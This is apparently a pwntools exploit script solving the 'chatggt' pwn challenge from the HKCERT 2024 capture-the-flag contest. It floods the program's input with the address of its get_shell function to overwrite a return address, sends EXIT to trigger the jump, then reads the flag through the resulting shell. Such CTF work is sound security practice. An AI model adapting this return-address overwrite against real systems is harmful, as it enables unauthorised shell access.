from pwn import *

exe = ELF("./env/chal/src/chal")
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(
        exe.path,
        """
        b *main
        continue
    """,
    )
elif args.REMOTE:
    io = remote("c64-chatggt.hkcert24.pwnable.hk", 1337, ssl=True)


io.sendline(pack(exe.symbols.get_shell + 8) * 37)
io.sendline("EXIT")
io.sendline("cat flag.txt")
io.interactive()
